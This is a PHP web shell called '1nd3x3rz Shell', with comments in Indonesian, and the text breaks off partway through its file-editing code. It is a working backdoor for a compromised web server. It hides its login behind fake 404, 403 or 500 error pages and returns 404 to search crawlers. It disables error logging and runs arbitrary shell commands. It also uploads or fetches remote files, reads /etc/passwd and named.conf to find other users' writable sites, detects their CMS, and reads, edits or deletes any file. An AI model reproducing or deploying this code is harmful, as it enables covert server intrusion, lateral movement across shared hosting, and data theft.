<?php
//////////////////////////////////////////////////////////////////////////
// 1nd3x3rz Shell by MyHeartIsyr                                        //
// Mengingat saya gak jago bikin shell                                  //
// Dan belum pernah deface sana sini,                                   //
// ya, beginilah shellnya :D                                            //
//////////////////////////////////////////////////////////////////////////
@session_start();
@set_time_limit(0);
@error_reporting(0);
@error_log(0);
@ini_set('error_log', NULL); 
@ini_set('log_errors', 0); 
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0); 
@ini_set('display_errors', 0);

$password = "10035423dfa668a00e46a41cd7d48cbf"; // pass: watashijomblo
$fake_error = 1; // 0: 404; 1: 403; 2: 500; 3: error script;
$os = strtolower(substr(PHP_OS,0,3)) ? "win" : "nix";
/****************************************************
* Charset:
*
* utf-8
* windows-1251
* koi8-r
* koi8-u
* cp866
*****************************************************/
$site_charset = "utf-8";

if(get_magic_quotes_gpc()){
	function alakazam_ss($array){
		return @is_array($array) ? array_map('alakazam_ss', $array) : stripslashes($array);
	}
	$_POST = alakazam_ss($_POST);
	$_GET = alakazam_ss($_GET);
}

if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

function fake404(){
?>
<html>
<head>
<title>404 Not Found</title>
<style>
input { border: 1px solid #fff; margin: 0; background-color: #fff; }
</style>
</head>
<body>
<h1>Not Found</h1> 
<p>The requested URL <?=$_SERVER['REQUEST_URI']?> was not found on this server. If you entered the URL manually please check your spelling and try again.</p>
<p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>
<center><form method="post">
<input type="password" name="code">
</center></form>
</body>
</html>
<?php
exit;
}

function fake403(){
?>
<html>
<head>
<title>403 Forbidden</title>
<style>
input { border: 1px solid #fff; margin: 0; background-color: #fff; }
</style>
</head>
<body>
<h1>Forbidden</h1> 
<p>You dont have permission to access <?=$_SERVER['REQUEST_URI']?> on this server.</p>
<p>Additionally, a 403 Forbidden error was encountered while trying to use an ErrorDocument to handle the request.</p>
<center><form method="post">
<input type="password" name="code">
</center></form>
</body>
</html>
<?php
exit;
}

function fake500(){
?>
<html>
<head>
<title>500 Internal Server Error</title>
<style>
input { border: 1px solid #fff; margin: 0; background-color: #fff; }
</style>
</head>
<body>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error or misconfiguration and was unable to complete your request.</p>
<p>Please contact the server administrator at <?=$_SERVER['SERVER_ADMIN']?> to inform them of the time this error occurred, and the actions you performed just before this error.</p>
<p>More information about this error may be available in the server error log.</p>
<p>Additionally, a 500 Internal Server Error error was encountered while trying to use an ErrorDocument to handle the request.</p>
<center><form method="post">
<input type="password" name="code">
</center></form>
</body>
</html>
<?php
exit;
}

function fake_errorscript(){
?>
<style>
input { margin:0;background-color:#fff;border:1px solid #fff; }
</style>
<br />
<b>Notice</b>:  Undefined variable: data in <b><?=$_SERVER['SCRIPT_FILENAME']?></b> on line <b>37</b><br />
<br />
<center><form method="post">
<input type="password" name="code">
</form></center>
<?php
exit;
}

switch($fake_error){
	case 0:
		if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
		if( empty($password) || ( isset($_POST['code']) && (md5($_POST['code']) == $password) ) )
			$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
		else
			fake404();
		break;
	case 1:
		if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
		if( empty($password) || ( isset($_POST['code']) && (md5($_POST['code']) == $password) ) )
			$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
		else
			fake403();
		break;
	case 2:
		if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
		if( empty($password) || ( isset($_POST['code']) && (md5($_POST['code']) == $password) ) )
			$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
		else
			fake500();
		break;
	case 3:
		if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
		if( empty($password) || ( isset($_POST['code']) && (md5($_POST['code']) == $password) ) )
			$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
		else
			fake_errorscript();
		break;
	default: break;
}

// Databases
$mysql = existance_feature('mysql_connect');
$mssql = existance_feature('mssql_connect');
$pgsql = existance_feature('pg_connect');
$oracle = existance_feature('oci_connect');
// Another
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=lime>OFF</font>";
$curl = existance_feature('curl_init');
$wget = (can_i_call_you('wget --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$perl = (can_i_call_you('perl --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$python = (can_i_call_you('python --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$ruby = (can_i_call_you('ruby --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$java = (can_i_call_you('java -h')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$gcc = (can_i_call_you('gcc --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$netcat = (can_i_call_you('nc -h')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$tar = (can_i_call_you('tar -h')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$ds = @ini_get('disable_functions');
if(!function_exists('posix_getegid')){
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}

if(isset($_GET['l0pth'])){
	$the_pwd = $_GET['l0pth'];
	@chdir($the_pwd);
}
else {
	$the_pwd = @getcwd();
}

$the_pwd = str_replace("\\", "/", $the_pwd);
$scan_pwd = explode("/", $the_pwd);

// pwd
$pwd_url = "";
foreach($scan_pwd as $a => $b){
	$pwd_url .= "<a href='?l0pth=";
	for($d = 0; $d <= $a; $d++){
		$pwd_url .= $scan_pwd[$d];
		if($d != $scan_pwd){
			$pwd_url .= "/";
		}
	}
	$pwd_url .= "'>".$b."</a>/";
}

// drives
if($GLOBALS['os'] == "win"){
	$my_drive = "";
	foreach(range("A","Z") as $my_drives){
		if(@is_dir($my_drives.":\\")){
			$my_drive .= "<a href=\"?l0pth=".$my_drives.":\\\">[ ";
			if($my_drives.":" != $the_pwd){
				$my_drive .= $my_drives;
			}
			else {
				$my_drive .= "<span>".$my_drives."</span>";
			}
		$my_drive .= " ]</a>";
		}
	}
}

function can_i_call_you($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} 
	elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} 
	elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} 
	elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}

function convertByte($s) {
if($s >= 1073741824)
return sprintf('%1.2f',$s / 1073741824 ).' GB';
elseif($s >= 1048576)
return sprintf('%1.2f',$s / 1048576 ) .' MB';
elseif($s >= 1024)
return sprintf('%1.2f',$s / 1024 ) .' KB';
else
return $s .' B';
}

function pandora($dir, $perm){
	if(!is_writable($dir)){
		return "<font color='red'>".$perm."</font>";
	} 
	else {
		return "<font color='lime'>".$perm."</font>";
	}
}

function octal2ascii_perms($file){
	$perms = fileperms($file);
	if (($perms & 0xC000) == 0xC000) {
	// Socket
	$info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
	// Symbolic Link
	$info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
	// Regular
	$info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
	// Block special
	$info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
	// Directory
	$info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
	// Character special
	$info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
	// FIFO pipe
	$info = 'p';
	} else {
	// Unknown
	$info = 'u';
	}
		// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));
	return $info;
}

function existance_feature($abx){
	if(function_exists($abx)){
		return "<font color='#00ff00'>ON</font>";
	}
	else {
		return "<font color='#ff0000'>OFF</font>";
	}
}

function ambil_aja($pink, $namanya){
	if($buka = @fopen($pink, "r")){
		while(@feof($buka)){
			$lihat = @fread($buka, 1024);
		}
		@fclose($buka);
		$bukalagi = @fopen($namanya, "w");
		@fwrite($bukalagi, $lihat);
		@fclose($bukalagi);
	}
}

function which($par){
	$path = can_i_call_you("which $par");
	if(!empty($par)){
		return trim($path);
	}
	else {
		return trim($par);
	}
}

function getthesource($cmd, $url){
	switch($cmd){
		case 'wwget':
			can_i_call_you(which('wget')." ".$url." -O ".$namafile);
			break;
		case 'wlynx':
			can_i_call_you(which('lynx')." -source ".$url." > ".$namafile);
			break;
		case 'wfread':
			ambil_aja($wurl, $filename);
			break;
		case 'wfetch':
			can_i_call_you(which('fetch')." -o ".$namafile." -p ".$url);
			break;
		case 'wlinks':
			can_i_call_you(which('links')." -source ".$url." > ".$namafile);
			break;
		case 'wget':
			can_i_call_you(which('GET')." ".$url." > ".$namafile);
			break;
		case 'wcurl':
			can_i_call_you(which('curl')." ".$url." -o ".$namafile);
			break;
		default: break;
	}
}


$header = "System: ".php_uname()."<br>";
$header .= "Apache Information: ".$_SERVER['SERVER_SOFTWARE']."<br>";
$header .= "Php Version: ".phpversion()."<br>";
$header .= "id: ".$user." uid: (".$uid.") group: ".$group." gid: (".$gid.")"."<br>";
$header .= "Databases: MySQL: $mysql | MSSQL: $mssql | PostgreSQL: $pgsql | Oracle: $oracle"."<br>";
$header .= "Curl: $curl | Python: $python | Perl: $perl | Java: $java | Ruby: $ruby | GCC: $gcc | NetCat: $netcat | Tar: $tar"."<br>";
if($GLOBALS['os'] == "win") { $header .= "Drives: $my_drive<br>"; }
else { $header .= "Drives: This is Linux<br>"; } 
$header .= "Pwd: $pwd_url"."<br>";

$info = "Server Ip: ".gethostbyname($_SERVER['HTTP_HOST'])."<br>";
$info .= "Your Ip: ".$_SERVER['REMOTE_ADDR']."<br>";
$info .= "Server Admin: ".$_SERVER['SERVER_ADMIN']."<br>";
$info .= "<center><a href='#' onclick='javascript:keluar();'>Logout</a> | <a href='#' onclick='javascript:konfirmasi();'>Remove</a></center>";
?>
<html charset="<?=$site_charset?>">
<head>
<title>-=[ 1nd3x3rz 5h3llz ]=-</title>
<style>
body {
background: #000000;
color: #ffffff;
}
* {
font-family: Verdana;
font-size: 13px;
}
.logo {
font-family: Arial;
text-align:center;
font-size:60px; 
}
a {
text-decoration: none;
color: #00ccff;
}
#tuls table, tr {
border: 1px solid #fff;
}
#tuls td:hover, tr:hover {
background-color: #000;
}
a:hover {
border-bottom: 1px solid #00ff00;
}
#filebrowse th {
background-color: #333333;
}
#filebrowse th:hover {
border-bottom: 1px dashed #00ff00;
}
#filebrowse td {
border-bottom: 1px solid #fff;
}
#filebrowse tr:hover {
background: #222222;
}
#tabel_joni table {
border: 1px solid #fff;
}
li {
display: inline;
margin: 5px;
padding: 5px;
}
.sesuatu {
border: 1px solid #444;
padding: 5px;
margin: 0;
overflow: auto;
}
pre {
font-family: Courier;
}
select {
background: transparent;
color: #fff;
border: 1px solid #fff;
}
option {
background: black;
color: #fff;
border: 1px solid #fff;
}
input {
background: transparent;
color: #fff;
border: 1px solid #fff;
}
input[type="submit"]:hover {
background: #ff0000;
color: #fff;
}
textarea {
font-family: Courier;
background: transparent;
color: #fff;
border: 1px solid #fff;
resize: none;
width: 100%;
height: 400px;
}
#mylink a {
padding:4px 18px;
margin:0;
background:#222222;
text-decoration:none;
letter-spacing:2px;
-moz-border-radius: 5px; 
-webkit-border-radius: 5px; 
-khtml-border-radius: 5px; 
border-radius: 5px;
}
#mylink a:hover {
background:#191919;
border-bottom:1px solid #333333;
border-top:1px solid #333333;
}
</style>
<script>
function konfirmasi(){
	var a = confirm("Are you sure to kill me?");
	if(a == true){
		return window.location = '?oph=kill';
	}
	else {
		return window.location = '?';
	}
}
function keluar(){
	var b = confirm("Yakin mau keluar?");
	if(b == true){
		return window.location = '?oph=logout';
	}
	else {
		return window.location = '?';
	}
}
</script>
</head>
<body>
<table><tr><td><table><tr><td><span class="logo">1nd3x3rz</span></td></tr></table></td><td><table style="width: 750px;"><tr><td><?=$header?></td></tr></table></td><td><table><tr><td><?=$info?></td></tr></table></td></tr></table>
<center><div id="mylink">
<ul>
<li><a href="?">Home</a></li>
<li><a href="?l0pth=<?=$the_pwd?>&dosya=upload">Upload</a></li>
<li><a href="?l0pth=<?=$the_pwd?>&dosya=jump">Jumping</a></li>
<li><a href="?l0pth=<?=$the_pwd?>&dosya=cms">CMS Detector</a></li>
<li><a href="?l0pth=<?=$the_pwd?>&dosya=bypass">Bypass</a></li>
</ul>
</div></center>
<?php
if(isset($_GET['dosya']) && $_GET['dosya'] == "upload"){
?>
<div id="tabel_joni"><form enctype="multipart/form-data" method="post">
<table width="500" align="center" border="0" cellpadding="0" cellspacing="1">
<tr><td style="background-color: #333333; border-bottom: 1px solid #fff;"><center>Upload From Computer</center></td></tr>
<tr><td><center><input type="radio" name="jenis_tempat" value="current_dir" checked>Biasa<input type="radio" name="jenis_tempat" value="public_html">public_html</center></td></tr>
<tr><td><center><input type="file" name="filenyo"></center></td></tr>
<tr><td><center><input type="submit" name="go" value="Upload"></center></td></tr>
</form></table><br><br>
<div id="tabel_joni"><form method="post">
<table width="500" align="center" border="0" cellpadding="0" cellspacing="1">
<tr><td style="background-color: #333333; border-bottom: 1px solid #fff;"><center>Upload From Web</center></td></tr>
<tr><td><input type="text" style="width: 250px;" name="furl" value="http://www.some-site.com/file.zip">
<select name="sedot">
<option value="wwget">Wget</option>
<option value="wlynx">Lynx</option>
<option value="wfread">Fread</option>
<option value="wfetch">Fetch</option>
<option value="wlinks">Links</option>
<option value="wget">GET</option>
<option value="wcurl">Curl</option>
</select></td></tr>
<tr><td><input type="text" style="width: 250px;" name="dirz" value="<?=$the_pwd?>">
<input type="submit" name="down" value=">>"></td></tr>
</form></table>
</div>
<?php
if(isset($_POST['go'])){
	$jenis = $_POST['jenis_tempat'];
	switch($jenis){
		case "current_dir":
			if(@copy($_FILES['filenyo']['tmp_name'], "$the_pwd/".$_FILES['filenyo']['name']."")) {
				echo "<font color=lime>Uploaded!</font> at <i>$the_pwd/".$_FILES['filenyo']['name']."</b></i>";
			} 
			else {
				echo "<font color=red>failed to upload file</font>";
			}
			break;
		case "public_html":
			$root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['filenyo']['name'];
			$web = $_SERVER['HTTP_HOST']."/".$_FILES['filenyo']['name'];
			if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
				if(@copy($_FILES['filenyo']['tmp_name'], $root)) {
					echo "<font color=lime>Uploaded!</font> at <i>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
				} 
				else {
					echo "<font color=red>failed to upload file</font>";
				}
			} 
			else {
				echo "<font color=red>failed to upload file</font>";
			}
			break;
		default: break;
	}
}
elseif(isset($_POST['down'])){
	$pilih = trim($_POST['sedot']);
	$furl = trim($_POST['furl']);
	$dirz = $_POST['dirz'];
	$do = sedot($pilih, $furl);
	$move = $dirz . $do;
	if($move){
		echo "File uploaded to $move";
	}
	else {
		echo "Failed to upload $move";
	}
}
}

elseif(isset($_GET['dosya']) && $_GET['dosya'] == "jump"){
	$i = 0;
    echo "<pre><div class='margin: 5px auto;'>";
    $etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
    while($passwd = fgets($etc)) {
        if($passwd == '' || !$etc) {
            echo "<font color=red>Can't read /etc/passwd</font>";
        } else {
            preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
            foreach($user_jumping[1] as $user_idx_jump) {
                $user_jumping_dir = "/home/$user_idx_jump/public_html";
                if(is_readable($user_jumping_dir)) {
                    $i++;
                    $jrw = "[<font color=lime>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
                    if(is_writable($user_jumping_dir)) {
                        $jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
                    }
                    echo $jrw;
                    if(function_exists('posix_getpwuid')) {
                        $domain_jump = file_get_contents("/etc/named.conf");
                        if($domain_jump == '') {
                            echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
                        } else {
                            preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
                            foreach($domains_jump[1] as $dj) {
                                $user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                                $user_jumping_url = $user_jumping_url['name'];
                                if($user_jumping_url == $user_idx_jump) {
                                    echo " => ( <u>$dj</u> )<br>";
                                    break;
                                }
                            }
                        }
                    } else {
                        echo "<br>";
                    }
                }
            }
        }
    }
    if($i == 0) {
    } else {
        echo "<br>Total ada ".$i." Kamar di ".gethostbyname($_SERVER['HTTP_HOST'])."";
    }
    echo "</div></pre>";
}

elseif(isset($_GET['dosya']) && $_GET['dosya'] == "cms"){
	if($GLOBALS['os'] == "nix"){
	function chk_header($link){
	$pee = get_headers($link,1);
	if(strpos($pee[0],"200")){
	return true;
	}else{ return false; }
	}
	
	function cms_add($link,$domain,$owner,$cms){
	$link = $link.'-'.$cms.'.txt';
	if(chk_header($link)){
		$url = 'http://'.$domain;
		$str = '<tr><td> <a href='.$url.'>'.$domain.'</a></td><td>'.$owner.'</td><td><a href='.$link.'>'.$cms.'</td>'.Chr(10);
		file_put_contents("pee.tmp",$str,FILE_APPEND);
		echo $str;
	}
	
	if(!file_exists('pee.tmp')){
	@fopen('pee.tmp', 'w');

	echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4">';
	echo'<tr><td><center>SITE</b></center></td><td><center>USER</b></center></td><td><center>CMS</b></center></td>';

	$p = 0;

	if(is_readable("/var/named")){
	$list = scandir("/var/named");
	$current_dir = posix_getcwd();
	$dir = explode("/",$current_dir);
	foreach($list as $domain){
	if(strpos($domain,".db"))
	{
	$domain = str_replace('.db','',$domain);
	$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
	
	error_reporting(0);

	$link = $pageURL.'pee/'.$owner['name'];

	cms_add($link,$domain,$owner['name'],"WordPress");
	cms_add($link,$domain,$owner['name'],"Joomla");
	cms_add($link,$domain,$owner['name'],"vBulletin");
	cms_add($link,$domain,$owner['name'],"WHMCS");
	cms_add($link,$domain,$owner['name'],"PhpBB");
	cms_add($link,$domain,$owner['name'],"MyBB");
	cms_add($link,$domain,$owner['name'],"IPB");
	cms_add($link,$domain,$owner['name'],"SMF");
	cms_add($link,$domain,$owner['name'],"Drupal");
	cms_add($link,$domain,$owner['name'],"e107");
	cms_add($link,$domain,$owner['name'],"Seditio");
	cms_add($link,$domain,$owner['name'],"osCommerce");

	}
	}
	}
	}else{
	echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" class="td1">';
	echo'<tr><td><center>SITE</b></center></td><td><center>USER</b></center></td><td><center>CMS</b></center></td>';
	$content = file_get_contents($pageURL.'pee.tmp');
	echo $content;
	}
	}
	}
	else {
		echo "[!] For Linux only d00d";
	}
}

elseif(isset($_GET['dosya']) && $_GET['dosya'] == "bypass"){
?>
<div id="tabel_joni"><table width="800" border="0" cellpadding="0" cellspacing="1" align="center">
<form method="post">
<tr><td style="background-color: #333333; border-bottom: 1px solid #fff;"><center>Bypass Users Server</center></td></tr>
<tr><td><input type="text" name="my_file" style="width: 250px;">
<select name="byebye">
<option value="msystem">system</option>
<option value="mshell_exec">shell_exec</option>
<option value="mpassthru">passthru</option>
<option value="mexec">exec</option>
<option value="mawk">awk</option>
</select>
<input type="submit" name="user-pass" value=">>"></td></tr>
</form></table>
</div><br><br>
<div id="tabel_joni"><table width="800" border="0" cellpadding="0" cellspacing="1" align="center">
<form method="post">
<tr><td style="background-color: #333333; border-bottom: 1px solid #fff;"><center>Bypass /etc/passwd</center></td></tr>
<tr><td><input type="text" name="your_file" value="cat /etc/passwd" readonly>
<select name="baybay">
<option value="bsystem">system</option>
<option value="bshell_exec">shell_exec</option>
<option value="bpassthru">passthru</option>
<option value="bexec">exec</option>
<option value="bposix_getpwuid">posix_getpwuid</option>
</select>
<input type="submit" name="etc-pass" value=">>"></td></tr>
</form></table>
</div><br><br>
<div id="tabel_joni"><table width="800" border="0" cellpadding="0" cellspacing="1" align="center">
<form method="post">
<tr><td style="background-color: #333333; border-bottom: 1px solid #fff;"><center>Read File</center></td></tr>
<tr><td><input type="text" name="our_file" style="width: 250px;">
<select name="boyboy">
<option value='show_source'>show_source</option>
<option value='highlight_file'>highlight_file</option>
<option value='readfile'>readfile</option>
<option value='include'>include</option>
<option value='require'>require</option>
<option value='file'>file</option>
<option value='fread'>fread</option>
<option value='file_get_contents'>file_get_contents</option>
<option value='fgets'>fgets</option>
<option value='curl_init'>curl_init</option>
</select>
<input type="submit" name="read-it" value=">>"></td></tr>
</form></table>
</div>
<?php
if(isset($_POST['user-pass'])){
	$byebye = $_POST['byebye'];
	switch($byebye){
		case "msystem":
			echo "<textarea style='width: 250px; height: 15px;'>";
			echo system($_POST['my_file']);
			echo "</textarea>";
			break;
		case "mshell_exec":
			echo "<textarea style='width: 250px; height: 15px;'>";
			echo shell_exec($_POST['my_file']);
			echo "</textarea>";
			break;
		case "mpassthru":
			echo "<textarea style='width: 250px; height: 15px;'>";
			echo passthru($_POST['my_file']);
			echo "</textarea>";
			break;
		case "mexec":
			echo "<textarea style='width: 250px; height: 15px;'>";
			echo system($_POST['my_file']);
			echo "</textarea>";
			break;
		case "mawk":
			echo "<textarea style='width: 250px; height: 15px;'>";
			echo shell_exec("awk -F: '{ print $1 }' ".$_POST['my_file']." | sort");
			echo "</textarea>";
			break;
		default: break;
	}
}
elseif(isset($_POST['etc-pass'])){
	$baybay = $_POST['baybay'];
	switch($baybay){
		case "bsystem":
			echo "<textarea style='width: 250px; height: 15px;'>";
			echo system($_POST['your_file']);
			echo "</textarea>";
			break;
		case "bshell_exec":
			echo "<textarea style='width: 250px; height: 15px;'>";
			echo shell_exec($_POST['your_file']);
			echo "</textarea>";
			break;
		case "bpassthru":
			echo "<textarea style='width: 250px; height: 15px;'>";
			echo passthru($_POST['your_file']);
			echo "</textarea>";
			break;
		case "bexec":
			echo "<textarea style='width: 250px; height: 15px;'>";
			echo exec($_POST['your_file']);
			echo "</textarea>";
			break;
		case "bposix_getpwuid":
			echo "<textarea style='width: 250px; height: 15px;'>";
			for($ini=0;$ini<60000;$ini++){ 
				$ara = posix_getpwuid($ini);
				if (!empty($ara)) {
					while (list ($key, $val) = each($ara)){
						print "$val:";
					}
					print "\n";
				}
			}
			echo "</textarea>";
			break;
		default: break;
	}
}
elseif(isset($_POST['read-it'])){
	$boyboy = $_POST['boyboy'];
	$our_file = $_POST['our_file'];
	switch ($boyboy){
		case 'show_source': $show =  @show_source($our_file);  break;
		case 'highlight_file': $highlight = @highlight_file($our_file); break;
		case 'readfile': $readfile = @readfile($our_file);  break;
		case 'include': $include = @include($our_file); break;
		case 'require': $require = @require($our_file);  break;
		case 'file': $file =  @file($our_file);  foreach ($our_file as $key => $value) {  print $value; }  break;
		case 'fread': $fopen = @fopen($our_file,"r") or die("Unable to open file!"); $fread = @fread($fopen,90000); fclose($fopen); print_r($fread); break;
		case 'file_get_contents': $file_get_contents =  @file_get_contents($our_file); print_r($file_get_contents);  break;
		case 'fgets': $fgets = @fopen($our_file,"r") or die("Unable to open file!"); while(!feof($fgets)) { echo fgets($fgets); } fclose($fgets); break;
		case 'curl_init': $ch = @curl_init("file:///".$our_file."".__FILE__); curl_exec($ch); break; 
		default: echo "{$boyboy} Not There"; 
	}
}
}
elseif(isset($_GET['oph']) && $_GET['oph'] == "logout"){
	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
	echo "<script>window.location='?';</script>";
}
elseif(isset($_GET['oph']) && $_GET['oph'] == "kill"){
	if(@unlink($_SERVER['PHP_SELF'])){
		echo "<script>window.location='/';</script>";
	}
	else {
		echo "[!] Gagal coy";
	}
}

elseif(isset($_GET['pandos']) && $_GET['pandos'] == "newfile"){
?>
<div id="tabel_joni"><table width="500" align="center" border="0" cellpadding="0" cellspacing="1">
<form method="post">
<tr><td style="background-color: #333333; border-bottom: 1px solid #fff;">Make File</td></tr>
<tr><td>Filename:&nbsp;<input style="width: 250px;" type="text" name="baru" value="<?=$the_pwd?>/new1.php">
<input type="submit" name="make_new" value=">>"></td></tr>
</form></table>
</div>
<?php
	if(isset($_POST['make_new'])){
		$baru = htmlspecialchars($_POST['baru']);
		$fp = @fopen($baru, "a");
		if($fp){
			echo "<script>window.location='?l0pth=".$the_pwd."&flux=".$_POST['baru']."';</script>";
		}
		else {
			echo "<font color='red'>Permission Denied</font>";
		}
	}
}
elseif(isset($_GET['pandos']) && $_GET['pandos'] == "newfolder"){
?>
<div id="tabel_joni"><table width="500" align="center" border="0" cellpadding="0" cellspacing="1">
<form method="post">
<tr><td style="background-color: #333333; border-bottom: 1px solid #fff;">Make Folder</td></tr>
<tr><td>Foldername:&nbsp;<input type="text" name="foldernyo">
<input type="submit" name="make_folder" value=">>"></td></tr>
</form></table>
</div>
<?php
if(isset($_POST['make_folder'])){
	$baru_folder = $the_pwd."/".htmlspecialchars($_POST['foldernyo']);
	if(@mkdir($baru_folder)){
		echo "<script>window.location='?l0pth='".$the_pwd."';</script>";
	}
	else {
		echo "<font color='red'>Permission Denied</font>";
	}
}
}

elseif(isset($_GET['pandos']) && $_GET['pandos'] == "rendir"){
?>
<div id="tabel_joni"><table width="500" align="center" border="0" cellpadding="0" cellspacing="1">
<form method="post">
<tr><td style="background-color: #333333; border-bottom: 1px solid #fff;">Rename Folder</td></tr>
<tr><td><input type="text" name="name_folder" value="<?=basename($the_pwd)?>">
<input type="submit" name="ren_folder" value=">>"></td></tr>
</form></table>
</div>
<?php
if(isset($_POST['ren_folder'])){
	$dir_rename = rename($dir, "".dirname($dir)."/".htmlspecialchars($_POST['ren_folder'])."");
	if($dir_rename){
		echo "<script>window.location='?l0pth=".dirname($the_pwd)."';</script>";
	}
	else {
		echo "<font color='red'>Permission Denied</font>";
	}
}
}

elseif(isset($_GET['pandos']) && $_GET['pandos'] == "rmdir"){
$delete = rmdir($the_pwd);
if($delete){
	echo "<script>window.location='?l0pth=".dirname($the_pwd)."';</script>";
}
else {
	echo "<font color='red'>Failed to remove ".basename($the_pwd)."</font>";
}
}

elseif(isset($_GET['pandos']) && $_GET['pandos'] == "view"){
?>
Filename: <font color="lime"><?=basename($_GET['flux'])?></font>[<a href="?pandos=view&l0pth=<?=$the_pwd?>&flux=<?=$_GET['flux']?>">view</b></a>] | [<a href="?pandos=highlight&l0pth=<?=$the_pwd?>&flux=<?=$_GET['flux']?>">highlight</b></a>] | [<a href="?pandos=edit&l0pth=<?=$the_pwd?>&flux=<?=$_GET['flux']?>">edit</b></a>] | [<a href="?pandos=ren&l0pth=<?=$the_pwd?>&flux=<?=$_GET['flux']?>">rename</b></a>] | [<a href="?pandos=download&l0pth=<?=$the_pwd?>&flux=<?=$_GET['flux']?>">download</b></a>] | [<a href="?pandos=rm&l0pth=<?=$the_pwd?>&flux=<?=$_GET['flux']?>">delete</b></a>] | [<a href="?pandos=chmod&l0pth=<?=$the_pwd?>&flux=<?=$_GET['flux']?>">chmod</a>]<br>
<pre class="sesuatu"><?=htmlspecialchars(file_get_contents($_GET['flux']))?></pre>
<?php
}

elseif(isset($_GET['pandos']) && $_GET['pandos'] == "edit"){
?>
Filename: <font color="lime"><?=basename($_GET['flux'])?></font> [<a href="?pandos=view&l0pth=<?=$the_pwd?>&flux=<?=$_GET['flux']?>">view</b></a>] | [<a href="?pandos=highlight&l0pth=<?=$the_pwd?>&flux=<?=$_GET['flux']?>">highlight</b></a>] | [<a href="?pandos=edit&l0pth=<?=$the_pwd?>&flux=<?=$_GET['flux']?>">edit</b></a>] | [<a href="?pandos=ren&l0pth=<?=$the_pwd?>&flux=<?=$_GET['flux']?>">rename</b></a>] | [<a href="?pandos=download&l0pth=<?=$the_pwd?>&flux=<?=$_GET['flux']?>">download</b></a>] | [<a href="?pandos=rm&l0pth=<?=$the_pwd?>&flux=<?=$_GET['flux']?>">delete</b></a>] | [<a href="?pandos=chmod&l0pth=<?=$the_pwd?>&flux=<?=$_GET['flux']?>">chmod</a>]<br>
<form method="post">
